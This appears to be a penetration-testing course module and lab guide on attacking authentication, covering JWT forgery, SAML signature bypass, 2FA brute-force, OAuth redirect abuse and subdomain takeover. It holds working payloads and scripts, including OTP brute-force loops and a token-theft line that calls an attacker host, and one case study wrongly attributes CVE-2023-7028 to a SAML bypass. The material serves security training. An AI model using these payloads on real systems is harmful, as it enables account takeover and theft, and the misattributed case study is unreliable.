# Day 1 - Module 2: Attacking Authentication and Single Sign-On (SSO)

**Duration:** 2.5 hours
**Prerequisites:** Module 1 completed, Burp Suite configured

---

## Slide 1: Authentication - The First Line of Defense

### Why Authentication Matters

**Authentication answers:** "Who are you?"
**Authorization answers:** "What can you do?"

### Common Authentication Methods

1. **Local Authentication:** Username/password stored in application DB
2. **Multi-Factor Authentication (MFA/2FA):** Something you know + something you have
3. **Single Sign-On (SSO):** OAuth, SAML, OpenID Connect
4. **API Keys/Tokens:** JWT, session tokens, API keys
5. **Certificate-based:** mTLS, client certificates
6. **Biometric:** Fingerprint, face recognition (mobile)

### Attack Surface

Every authentication mechanism has potential weaknesses:
- Implementation flaws
- Configuration errors
- Logic vulnerabilities
- Cryptographic weaknesses

---

## Slide 2: Boundary Conditions - Finding Edge Cases

### What Are Boundary Conditions?

Edge cases in authentication logic that developers often overlook.

### Common Boundary Condition Vulnerabilities

**1. Email Case Sensitivity**
```python
# Vulnerable code
if user.email == input_email:
    # Grant access

# Bypass
# Register: User@Example.com
# Login: user@example.com (different user object!)
```

**2. Unicode Normalization**
```
# Register: admin@example.com (with special Unicode chars)
# Login: admin@example.com (normalized)
# Result: Bypass or account takeover
```

**3. Null Byte Injection**
```
Username: admin%00.attacker
# May truncate at null byte in some backends
# Effective username: admin
```

**4. SQL Truncation**
```sql
-- If username field is VARCHAR(20)
-- Register: 'admin              x' (20+ chars)
-- Gets truncated to: 'admin'
-- May overwrite existing admin account
```

**5. Array/Object Type Confusion**
```json
# Normal login
{"username": "user1", "password": "pass123"}

# Type confusion attempt
{"username": ["admin"], "password": "pass123"}
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### Testing Methodology

```python
# Test script for boundary conditions
payloads = [
    "admin",
    "Admin",
    "ADMIN",
    "admin ",
    " admin",
    "admin\x00",
    "admin%00",
    "admin\n",
    "admin\r\n",
    ["admin"],
    {"$ne": None},
]

for payload in payloads:
    test_login(username=payload, password="test")
```

---

## Slide 3: JWT (JSON Web Tokens) Exploitation

### JWT Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

[Header].[Payload].[Signature]
```

**Decoded:**

Header:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload:
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "user",
  "iat": 1516239022
}
```

Signature:
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### JWT Attack Vectors

**1. Algorithm Confusion (None Algorithm)**

```json
# Change header
{
  "alg": "none",
  "typ": "JWT"
}

# Modify payload
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "admin"  // Changed from "user"
}

# Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIn0.
```

**2. Algorithm Confusion (RS256 to HS256)**

```python
# If server uses RS256 (asymmetric) but accepts HS256 (symmetric)
# Get the public key (often exposed)
public_key = get_public_key()

# Create forged token using public key as HMAC secret
import jwt
payload = {"sub": "admin", "role": "admin"}
forged_token = jwt.encode(payload, public_key, algorithm="HS256")
```

**3. Weak Secret Key Brute-Force**

```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Using jwt_tool
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# Using John the Ripper
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

**4. Missing Signature Verification**

```bash
# Test if server validates signature at all
# Modify payload without updating signature
# If accepted, server isn't validating!
```

**5. JWT Claims Manipulation**

```json
// Common vulnerable claims to modify:
{
  "user_id": "123",      // Change to target user
  "role": "admin",       // Escalate privileges
  "is_admin": true,      // Add admin flag
  "exp": 9999999999,     // Extend expiration
  "iat": 1234567890,     // Manipulate issued-at time
  "email_verified": true // Bypass email verification
}
```

**6. JKU/X5U Header Injection**

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"  // Malicious key source
}
```

### JWT Testing with jwt_tool

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Scan for vulnerabilities
python3 jwt_tool.py <JWT_TOKEN>

# Test all attack vectors
python3 jwt_tool.py <JWT_TOKEN> -M at

# Brute-force secret
python3 jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt

# Modify claims
python3 jwt_tool.py <JWT_TOKEN> -T

# Inject JKU header
python3 jwt_tool.py <JWT_TOKEN> -X i -ju https://attacker.com/jwks.json
```

---

## Slide 4: JWS (JSON Web Signature) Exploitation

### JWS vs JWT

- **JWT:** General token format
- **JWS:** JWT with signature verification
- **JWE:** JWT with encryption

### Advanced JWS Attacks

**1. CVE-2022-21449 - Psychic Signatures (Java)**

Affects Java 15-18 ECDSA signature validation:

```python
# Send JWT with signature of all zeros
# r = 0, s = 0
# Vulnerability accepts this as valid!

import base64
import json

header = {"alg": "ES256", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

# Psychic signature (all zeros)
signature = base64.urlsafe_b64encode(b'\x00' * 64).rstrip(b'=')

forged_jwt = f"{header_b64.decode()}.{payload_b64.decode()}.{signature.decode()}"
```

**2. KID (Key ID) Injection**

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/etc/passwd"  // Path traversal
}

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../public/logo.png"  // Use known file as key
}

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key.txt' UNION SELECT 'secretkey"  // SQL injection
}
```

---

## Slide 5: SAML (Security Assertion Markup Language)

### SAML Flow Overview

```
┌──────────┐                           ┌──────────────┐                    ┌──────────┐
│  User    │                           │   Service    │                    │ Identity │
│  Browser │                           │   Provider   │                    │ Provider │
│          │                           │   (SP)       │                    │ (IdP)    │
└────┬─────┘                           └──────┬───────┘                    └────┬─────┘
     │                                        │                                 │
     │  1. Access Resource                    │                                 │
     ├───────────────────────────────────────>│                                 │
     │                                        │                                 │
     │  2. Redirect to IdP with SAML Request  │                                 │
     │<───────────────────────────────────────┤                                 │
     │                                        │                                 │
     │  3. Forward SAML Request               │                                 │
     ├────────────────────────────────────────┴────────────────────────────────>│
     │                                                                           │
     │  4. Authenticate User                                                     │
     │<──────────────────────────────────────────────────────────────────────────┤
     │                                                                           │
     │  5. Send SAML Response                                                    │
     │<──────────────────────────────────────────────────────────────────────────┤
     │                                        │                                 │
     │  6. Post SAML Response to SP           │                                 │
     ├───────────────────────────────────────>│                                 │
     │                                        │                                 │
     │  7. Grant Access                       │                                 │
     │<───────────────────────────────────────┤                                 │
```

### SAML Response Structure

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>user@example.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      ...
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

### SAML Authorization Bypass Techniques

**1. Signature Exclusion Attack**

```xml
<!-- Remove signature entirely -->
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
    <!-- Signature removed! -->
  </saml:Assertion>
</samlp:Response>
```

**2. Signature Wrapping (XSW) Attack**

```xml
<samlp:Response>
  <!-- Original signed assertion -->
  <saml:Assertion ID="original">
    <saml:Subject>
      <saml:NameID>attacker@example.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <!-- Valid signature for original assertion -->
    </ds:Signature>
  </saml:Assertion>

  <!-- Injected malicious assertion (unsigned) -->
  <saml:Assertion ID="malicious">
    <saml:Subject>
      <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**3. Comment Injection**

```xml
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>user@example.com<!--
    --></saml:NameID><!--
    --><saml:NameID>admin@example.com</saml:NameID>
  </saml:Subject>
  <ds:Signature>
    <!-- Signature validates "user@example.com" -->
  </ds:Signature>
</saml:Assertion>
```

**4. Token Recipient Confusion**

```xml
<!-- SAML response intended for siteA.com -->
<!-- Send to siteB.com -->
<!-- If siteB doesn't validate Recipient attribute, may accept -->
<saml:SubjectConfirmation>
  <saml:SubjectConfirmationData
    NotOnOrAfter="2024-12-31T23:59:59Z"
    Recipient="https://siteA.com/saml/acs"  <!-- Wrong recipient! -->
    InResponseTo="_abc123"/>
</saml:SubjectConfirmation>
```

### SAML Testing Tools

```bash
# SAML Raider (Burp Extension)
# - Intercept and modify SAML messages
# - Automatic signature removal
# - XSW attack payload generation

# Manual testing with Python
import base64
import zlib
from lxml import etree

# Decode SAML Response
saml_response_b64 = request.POST['SAMLResponse']
saml_response = base64.b64decode(saml_response_b64)
saml_xml = zlib.decompress(saml_response, -zlib.MAX_WBITS)

# Parse and modify
doc = etree.fromstring(saml_xml)
# Modify attributes, remove signatures, etc.

# Re-encode
modified_saml = base64.b64encode(zlib.compress(etree.tostring(doc)))
```

---

## Slide 6: Bypassing 2FA/MFA

### Common 2FA Implementation Flaws

**1. Direct Access (Broken Flow)**

```
Step 1: POST /login (username + password) → 200 OK
Step 2: POST /verify-2fa (OTP code) → Redirect to /dashboard

Attack: Skip step 2, go directly to /dashboard
```

**2. Response Manipulation**

```json
// Server response after wrong OTP
{"success": false, "message": "Invalid code"}

// Modify to
{"success": true, "message": "Valid code"}
```

**3. Status Code Manipulation**

```http
POST /verify-2fa
Host: example.com

Code=123456

HTTP/1.1 401 Unauthorized

// Change to
HTTP/1.1 200 OK
```

**4. Rate Limiting Bypass**

```python
# No rate limiting on 2FA endpoint
# Brute-force 6-digit OTP: 000000-999999

import requests

for code in range(1000000):
    otp = f"{code:06d}"
    response = requests.post(
        "https://example.com/verify-2fa",
        data={"code": otp},
        cookies={"session": "abc123"}
    )
    if response.status_code == 200:
        print(f"Valid code: {otp}")
        break
```

**5. OTP Reuse**

```bash
# Test if same OTP works multiple times
# Or if old OTP remains valid after new one is generated
```

**6. Backup Codes Weakness**

```bash
# Check if backup codes are:
# - Predictable (sequential numbers)
# - Weak entropy (short codes)
# - Reusable
# - Never expire
```

**7. Remember Me Bypass**

```http
POST /login
username=victim&password=pass&remember=true

# If "remember me" bypasses 2FA on future logins
# Steal remember-me token for persistent access
```

**8. OAuth Token Bypass**

```javascript
// JavaScript that checks 2FA
if (user.twoFactorEnabled) {
    redirect('/verify-2fa');
} else {
    redirect('/dashboard');
}

// Modify user.twoFactorEnabled in JWT or session
```

### 2FA Bypass Testing Checklist

```markdown
- [ ] Can you access protected resources without completing 2FA?
- [ ] Can you manipulate response to bypass 2FA check?
- [ ] Is there rate limiting on 2FA code submission?
- [ ] Can you reuse old 2FA codes?
- [ ] Are backup codes predictable or weak?
- [ ] Does "remember me" permanently bypass 2FA?
- [ ] Can you remove 2FA requirement via parameter manipulation?
- [ ] Is 2FA enforced server-side or client-side only?
- [ ] Can you use victim's session before they complete 2FA?
```

---

## Slide 7: OAuth Misconfiguration Attacks

### OAuth 2.0 Flow Basics

```
┌──────────┐                                  ┌──────────────┐                    ┌──────────────┐
│  User    │                                  │  Client App  │                    │    OAuth     │
│          │                                  │              │                    │   Provider   │
└────┬─────┘                                  └──────┬───────┘                    └──────┬───────┘
     │                                               │                                   │
     │  1. Initiate OAuth (Click "Login with X")     │                                   │
     ├──────────────────────────────────────────────>│                                   │
     │                                               │                                   │
     │  2. Redirect to OAuth provider with state     │                                   │
     │<──────────────────────────────────────────────┤                                   │
     │                                               │                                   │
     │  3. User authorizes                           │                                   │
     ├───────────────────────────────────────────────┴──────────────────────────────────>│
     │                                                                                   │
     │  4. Redirect back with authorization code                                         │
     │<──────────────────────────────────────────────┬───────────────────────────────────┤
     │                                               │                                   │
     │  5. Forward authorization code                │                                   │
     ├──────────────────────────────────────────────>│                                   │
     │                                               │  6. Exchange code for access token│
     │                                               ├──────────────────────────────────>│
     │                                               │                                   │
     │                                               │  7. Return access token           │
     │                                               │<──────────────────────────────────┤
     │  8. Login successful                          │                                   │
     │<──────────────────────────────────────────────┤                                   │
```

### OAuth Attack Vectors

**1. Missing State Parameter (CSRF)**

```http
# Attacker initiates OAuth flow
GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback
# No state parameter!

# Victim clicks link, authorizes
# Callback: https://app.com/callback?code=VICTIM_CODE

# Attacker intercepts or pre-plants this callback
# Attacker's account now linked to victim's OAuth identity
```

**2. Open Redirect via redirect_uri**

```http
# Intended redirect
redirect_uri=https://app.com/callback

# Open redirect attempts
redirect_uri=https://app.com.attacker.com/callback
redirect_uri=https://app.com@attacker.com/callback
redirect_uri=https://app.com/callback?next=https://attacker.com
redirect_uri=https://app.com%252eattacker.com/callback (double encoding)
redirect_uri=https://app.com/callback/../../../attacker.com
```

**3. Authorization Code Leakage**

```http
# Callback URL
https://app.com/callback?code=AUTH_CODE&state=xyz

# If app then redirects
https://app.com/dashboard?referrer=https://app.com/callback?code=AUTH_CODE

# Code leaked in Referer header!
```

**4. Token Theft via redirect_uri**

```http
# Implicit flow (access_token in URL fragment)
redirect_uri=https://app.com/callback#access_token=SECRET_TOKEN

# If app redirects to attacker-controlled page
<script>
  window.location = 'https://attacker.com/steal?token=' + window.location.hash;
</script>
```

**5. scope Manipulation**

```http
# Normal request
scope=read:profile

# Escalated request
scope=read:profile write:profile admin:all

# Test if extra scopes are granted without user consent
```

**6. Pre-Account Takeover**

```
1. Attacker starts OAuth flow, gets callback URL with code
2. Victim creates account using same OAuth provider
3. Victim clicks attacker's link (callback URL)
4. Victim's new account linked to attacker's OAuth identity
5. Attacker logs in via OAuth → access to victim's account
```

### OAuth Testing with Burp

```http
# Intercept OAuth flow steps
# Test each parameter for manipulation

# Test redirect_uri validation
1. Remove redirect_uri entirely
2. Add multiple redirect_uri parameters
3. Try subdomain wildcard bypass
4. Test path traversal
5. Try open redirects

# Test state parameter
1. Remove state parameter
2. Reuse old state token
3. Use predictable state value

# Test code parameter
1. Replay authorization code
2. Use code across different clients
3. Test code expiration
```

---

## Slide 8: Authentication Bypass via Subdomain Takeover

### What is Subdomain Takeover?

When a subdomain (e.g., `old.example.com`) points to an external service that is no longer in use, an attacker can claim that service and control the subdomain.

### OAuth + Subdomain Takeover = Account Takeover

**Scenario:**

```
1. app.com uses OAuth with redirect_uri whitelist:
   - https://app.com/callback
   - https://old.app.com/callback  (vulnerable!)

2. old.app.com points to Heroku app that was deleted
   CNAME: old.app.com → old-app-123.herokuapp.com

3. Attacker claims old-app-123.herokuapp.com on Heroku

4. Attacker now controls https://old.app.com

5. OAuth attack:
   /oauth/authorize?redirect_uri=https://old.app.com/steal-code

6. Victim authorizes, code sent to attacker-controlled domain

7. Attacker uses code to take over victim's account
```

### Finding Vulnerable Subdomains

```bash
# Enumerate subdomains
subfinder -d example.com -o subdomains.txt
amass enum -d example.com -o subdomains.txt

# Check for takeover vulnerabilities
subzy run --targets subdomains.txt

# Manual verification
dig old.app.com
# Look for CNAME to third-party services:
# - GitHub Pages
# - Heroku
# - AWS S3
# - Azure
# - Shopify
# - Tumblr
# - etc.
```

### Exploiting Subdomain Takeover

```bash
# Example: GitHub Pages takeover

# 1. Find vulnerable subdomain
dig docs.example.com
# CNAME: old-docs.github.io

# 2. Create GitHub repo named "old-docs"

# 3. Enable GitHub Pages

# 4. Verify you control docs.example.com

# 5. Use in OAuth redirect_uri or cookie domain attacks
```

---

## Slide 9: Lab 2 - JWT & SSO Exploitation

### Lab Environment

**Vulnerable App:** `https://lab2.webapp-training.local`

**Objectives:**
1. Exploit weak JWT validation
2. Perform SAML signature bypass
3. Bypass 2FA implementation flaw
4. Test OAuth misconfiguration

### Part 1: JWT Exploitation (45 min)

**Task 1: Algorithm Confusion**

```bash
# Login as regular user
curl -X POST https://lab2.webapp-training.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password123"}' \
  -v

# Extract JWT from response
TOKEN="eyJ..."

# Analyze with jwt_tool
jwt_tool $TOKEN

# Try "none" algorithm attack
jwt_tool $TOKEN -X a

# Modify role claim
jwt_tool $TOKEN -T
# Change "role": "user" to "role": "admin"

# Test modified token
curl https://lab2.webapp-training.local/api/admin \
  -H "Authorization: Bearer $MODIFIED_TOKEN"
```

**Task 2: Weak Secret Brute-Force**

```bash
# Extract JWT
TOKEN="eyJ..."

# Crack the secret
jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Once secret is found, forge admin token
jwt_tool $TOKEN -S hs256 -p "weak-secret" \
  -I -pc role -pv admin
```

### Part 2: SAML Bypass (30 min)

**Task 1: Intercept SAML Response**

```
1. Start OAuth/SAML flow in Burp
2. Intercept POST to /saml/acs with SAMLResponse
3. Decode Base64 SAML response
4. Analyze XML structure
```

**Task 2: Signature Removal**

```xml
<!-- Original SAML response (Base64 decode it first) -->
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <!-- Remove this entire element -->
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>

<!-- Re-encode and forward -->
```

**Task 3: Attribute Manipulation**

```xml
<!-- Change role attribute -->
<saml:Attribute Name="role">
  <saml:AttributeValue>admin</saml:AttributeValue>  <!-- Changed! -->
</saml:Attribute>
```

### Part 3: 2FA Bypass (30 min)

**Task 1: Direct Access Test**

```bash
# Login with valid credentials
curl -X POST https://lab2.webapp-training.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password123"}' \
  -c cookies.txt

# Try accessing protected resource without completing 2FA
curl https://lab2.webapp-training.local/api/dashboard \
  -b cookies.txt
```

**Task 2: Rate Limiting Test**

```python
import requests

session = requests.Session()

# Login first
session.post('https://lab2.webapp-training.local/api/login',
             json={'username': 'user1', 'password': 'password123'})

# Brute-force 2FA code
for code in range(100000, 999999):
    response = session.post('https://lab2.webapp-training.local/api/verify-2fa',
                           json={'code': str(code)})

    if response.status_code == 200:
        print(f"Valid code: {code}")
        break

    if response.status_code == 429:
        print("Rate limited!")
        break
```

### Part 4: OAuth Attack (30 min)

**Task 1: State Parameter Test**

```http
# Original OAuth flow
GET /oauth/authorize?client_id=app&redirect_uri=https://lab2.webapp-training.local/callback&state=abc123

# Test without state
GET /oauth/authorize?client_id=app&redirect_uri=https://lab2.webapp-training.local/callback

# If no error, vulnerable to CSRF!
```

**Task 2: redirect_uri Validation**

```http
# Test open redirect
redirect_uri=https://lab2.webapp-training.local@attacker.com/callback
redirect_uri=https://lab2.webapp-training.local.attacker.com/callback
redirect_uri=https://lab2.webapp-training.local/callback?next=https://attacker.com
redirect_uri=https://lab2.webapp-training.local/callback/../../../attacker.com
```

### Deliverables

1. **JWT Findings:**
   - Identified algorithm vulnerabilities
   - Cracked JWT secret (if applicable)
   - Proof-of-concept admin JWT

2. **SAML Findings:**
   - SAML bypass technique used
   - Modified SAML response
   - Screenshot of successful bypass

3. **2FA Findings:**
   - Bypass method discovered
   - Rate limiting assessment
   - Recommendations

4. **OAuth Findings:**
   - Missing security controls
   - Successful attack PoC
   - Impact assessment

---

## Slide 10: Real-World Case Studies

### Case Study 1: Gitlab SAML Bypass (CVE-2023-7028)

**Vulnerability:** SAML signature validation bypass
**Impact:** Full account takeover
**Root Cause:** Incorrect XML parsing allowing signature wrapping

### Case Study 2: Zoom Authentication Bypass

**Vulnerability:** JWT "none" algorithm accepted
**Impact:** Join any meeting without password
**Lesson:** Always enforce signature validation

### Case Study 3: OAuth Misconfiguration at Fortune 500

**Vulnerability:** Open redirect in redirect_uri
**Impact:** Account takeover of 1M+ users
**Attack Flow:**
1. Attacker sends malicious OAuth link
2. Victim authorizes
3. Auth code leaked to attacker
4. Attacker gains full account access

---

## Slide 11: Best Practices & Mitigations

### JWT Security

- Always validate signature
- Explicitly reject "none" algorithm
- Use strong secrets (256+ bits entropy)
- Implement short expiration times
- Validate all claims (iss, aud, exp, nbf)
- Use RS256 instead of HS256 when possible
- Never trust JWT headers blindly (alg, kid, jku)

### SAML Security

- Always validate XML signatures
- Implement signature wrapping protections
- Validate assertion timestamps
- Check recipient and destination attributes
- Use SAML libraries with known security track record
- Implement certificate pinning

### 2FA Security

- Enforce 2FA server-side, not client-side
- Implement rate limiting (max 5 attempts)
- Make codes time-based and short-lived
- Invalidate codes after use
- Use cryptographically secure random generation
- Implement account lockout after failed attempts

### OAuth Security

- Always implement state parameter
- Whitelist exact redirect URIs (no wildcards)
- Validate redirect_uri against exact match
- Use short-lived authorization codes
- Implement PKCE for public clients
- Validate audience and scope
- Use HTTPS only

---

## Slide 12: Capstone Drill Preview

### Lunch Break (1 hour)

### After Lunch: Capstone Drill (1.25 hours)

**Scenario:** You've been hired to test a financial services web application.

**Objectives:**
1. Perform reconnaissance to identify attack surface
2. Find and exploit an authentication bypass
3. Document your attack chain
4. Produce a proof-of-concept

**Deliverables:**
- Reconnaissance report
- PoC for at least 1 authentication bypass
- Screenshots and evidence
- Attack narrative

**Success Criteria:**
- Gain unauthorized access to admin panel
- Extract sensitive data
- Document full attack chain

**Time:** 75 minutes exploitation + 15 minutes documentation

---

## Instructor Notes

### Timing Breakdown
- Slides 1-2: 20 min (Authentication basics & boundary conditions)
- Slide 3: 30 min (JWT exploitation - detailed!)
- Slide 4: 15 min (JWS advanced attacks)
- Slide 5: 20 min (SAML)
- Slide 6: 20 min (2FA bypass)
- Slide 7: 25 min (OAuth)
- Slide 8: 10 min (Subdomain takeover)
- Slides 9: 45 min (Lab walkthrough & support)
- Slides 10-11: 10 min (Case studies & best practices)
- Slide 12: 5 min (Capstone preview)

### Lab Setup Requirements
- JWT-vulnerable app with weak secret
- SAML test application
- 2FA bypass scenarios
- OAuth misconfiguration examples

### Common Student Challenges
- Understanding JWT structure (provide decoder tool)
- XML manipulation for SAML (provide examples)
- Python scripting for 2FA brute-force
- OAuth flow complexity (diagram heavily!)

### Tools to Have Ready
- jwt_tool pre-installed
- Burp Suite with SAML Raider extension
- Python environment with requests library
- OAuth flow diagram handout

### Assessment Checkpoints
- Can students decode and analyze JWTs?
- Do they understand signature validation importance?
- Can they identify 2FA implementation flaws?
- Do they grasp OAuth security model?
